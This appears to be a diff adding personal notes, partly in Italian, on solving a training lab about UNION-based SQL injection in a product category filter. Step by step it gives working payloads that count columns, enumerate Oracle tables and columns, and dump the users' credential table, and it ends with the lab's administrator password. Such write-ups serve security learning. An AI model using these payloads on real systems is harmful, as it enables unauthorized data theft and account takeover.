@@ -1,0 +1,62 @@
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords.
+You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+
+IPOTESI QUERY
+
+SELECT * FROM 'CategoryId';
+
+
+1) DETERMINARE IL NUMERO DI COLONNE
+
+
+SELECT * FROM 'CategoryId';
+' ORDER BY 2--
+= SELECT * FROM 'CategoryId' ORDER BY 1--';
+
+
+SELECT * FROM 'CategoryId';
+' UNION SELECT NULL,NULL FROM dual--
+= SELECT * FROM 'CategoryId' UNION SELECT NULL,NULL FROM dual--';
+
+
+2) DETERMINARE QUALI COLONNE SUPPORTANO IL CAMPO TESTO
+
+SELECT * FROM 'CategoryId';
+' UNION SELECT 'A','A' FROM dual--
+= SELECT * FROM 'CategoryId' UNION SELECT 'A','A' FROM dual--';
+
+
+3) TROVARE IL NOME DELLE TABELLE
+
+SELECT * FROM 'CategoryId';
+' UNION SELECT table_name,NULL FROM all_tables--
+= SELECT * FROM 'CategoryId' UNION SELECT table_name,NULL FROM all_tables--';
+
+
+Nome tabella: USERS_UVEATK
+
+
+4) TROVARE I NOMI DELLE COLONNE
+
+SELECT * FROM 'CategoryId';
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_UVEATK'--
+= SELECT * FROM 'CategoryId' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_UVEATK'--';
+
+Nomi colonne: USERNAME_VJLSXJ , PASSWORD_ASUDCK
+
+
+5) ESTRATTE PASSWORD UTENTE administrator
+
+SELECT * FROM 'CategoryId';
+' UNION SELECT USERNAME_VJLSXJ,PASSWORD_ASUDCK FROM USERS_UVEATK--
+= SELECT * FROM 'CategoryId';
+
+
+
+Password: 1u8j9k1shhyhdec8c8hl
